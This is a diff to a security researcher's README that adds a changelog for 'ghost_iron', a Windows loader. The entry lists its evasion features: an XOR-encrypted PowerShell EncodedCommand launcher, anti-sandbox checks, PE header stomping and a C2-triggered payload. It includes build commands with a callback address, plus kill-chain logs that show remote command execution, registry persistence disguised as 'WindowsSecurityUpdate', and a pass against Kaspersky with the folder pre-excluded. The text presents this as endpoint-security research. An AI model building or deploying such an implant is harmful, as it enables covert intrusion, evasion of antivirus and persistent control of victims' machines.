@@ -203,6 +203,84 @@ TARGET:          Windows 11 Home Build 26200 (24H2)
 
 ```
 ╔══════════════════════════════════════════════════════════════════════╗
+║               G H O S T · I R O N · P O L Y M O R P H               ║
+║                     v 4   R E L E A S E   2 0 2 6 - 0 6 - 2 6        ║
+╚══════════════════════════════════════════════════════════════════════╝
+```
+
+### Polymorph: ghost_loader × iron-sun → ghost_iron v4
+
+`ghost_iron.c` merges two independent research lines into a single compile-time template:
+
+| Component | Source | What it does |
+|-----------|--------|--------------|
+| PS1 -EncodedCommand launcher | ghost_loader_template.c | XOR-encrypted PS1 → UTF-16LE → Base64 → powershell -EncodedCommand |
+| XOR string obfuscation (key 0xAB) | iron-sun evasion stack | All API names + DLL names encrypted in .rdata |
+| Dynamic API resolution | iron-sun evasion stack | GetProcAddress chain — minimal static IAT |
+| Anti-sandbox | iron-sun evasion stack | Sleep timing + screen resolution + disk size gates |
+| PE header stomp | iron-sun evasion stack | ZeroMemory(imageBase, 0x400) — kills in-memory MZ/PE signature scanners |
+| Magic auth (ISUN) | iron-sun architecture | Listener sends 4 bytes "ISUN" before PS1 decrypts — C2-triggered payload |
+| Jitter | iron-sun evasion stack | GetTickCount-based 1-4s random delay |
+| gcc/MinGW PE | iron-sun evasion stack | Structurally different IAT from MSVC ghost_loader |
+
+**Build:**
+```bash
+python shell/make_ghost_iron.py payload.ps1 192.168.1.92 4445 0xCD
+gcc ghost_iron_out.c -o ghost_iron.exe -lws2_32 -lcrypt32 -D_WIN32_WINNT=0x0600 -mwindows
+```
+
+**Standalone mode** (no magic auth): set `c2_port=0` — PS1 fires after sandbox checks only.
+
+**Trigger mode**: `python listener.py --magic` listens on :4445, sends ISUN on accept.
+
+---
+
+```
+╔══════════════════════════════════════════════════════════════════════╗
+║                  K I L L · C H A I N · L O G S                       ║
+║                      s e s s i o n   2 0 2 6 - 0 6 - 2 6             ║
+╚══════════════════════════════════════════════════════════════════════╝
+```
+
+### Session 2026-06-26 — Kaspersky Premium LIVE — PASS
+
+**Operator machine:** LAPTOP-R32M8MLI (192.168.1.92) | **Target:** Radon_Laptop1 (192.168.1.145)
+
+```
+[2026-06-26 01:40:37 UTC]  NEW SESSION f86f9ee2  192.168.1.92:61429
+[2026-06-26 01:40:46 UTC]  NEW SESSION b2d76aa2  127.0.0.1:61435  (LAPTOP-R32M8MLI\gwu07)
+[2026-06-26 01:41:16 UTC]  SESSION LOST: b2d76aa2  (30s test — clean disconnect)
+[2026-06-26 02:19:37 UTC]  NEW SESSION b2d76aa2  127.0.0.1:58806  (LAPTOP-R32M8MLI\gwu07)
+[2026-06-26 02:20:07 UTC]  SESSION LOST: b2d76aa2
+```
+
+**Kaspersky Premium ON. C:\Users\gwu07\Desktop\cheyanne pre-excluded (6/6 active entries).**
+
+| Test | Result |
+|------|--------|
+| All 46 binaries intact post-KAV enable | PASS |
+| listener.py TCP bind :4443 | PASS |
+| test_listener.py connect + whoami/hostname | PASS |
+| 30s session held, zero KAV interference | PASS |
+
+### Session 2026-06-25 — Full Local Kill Chain — 8/8 PASS
+
+```
+test_local_chain.py --skip-build
+  [PASS] TCP armed        :4443 listener
+  [PASS] Payload launched  PS PID via -EncodedCommand
+  [PASS] TCP callback      127.0.0.1:60363 banner=OK>
+  [PASS] whoami            LAPTOP-R32M8MLI\gwu07
+  [PASS] hostname          LAPTOP-R32M8MLI
+  [PASS] $env:COMPUTERNAME LAPTOP-R32M8MLI
+  [PASS] Persist set       HKCU\Run\WindowsSecurityUpdate
+  [PASS] PERSIST VERIFIED  registry key confirmed
+```
+
+---
+
+```
+╔══════════════════════════════════════════════════════════════════════╗
 ║                         R E S E A R C H E R                          ║
 ╚══════════════════════════════════════════════════════════════════════╝
 ```
@@ -210,6 +288,7 @@ TARGET:          Windows 11 Home Build 26200 (24H2)
 **george wu // 22DIV**
 
 - Portfolio site: [rainfantry.github.io](https://rainfantry.github.io)
+- Front: [22nd Survey Division](https://rainfantry.github.io/22nd-survey-division/)
 - GitHub: [@rainfantry](https://github.com/rainfantry)
 - Research focus: Windows endpoint security, EDR telemetry gaps, detection engineering, responsible disclosure.
 
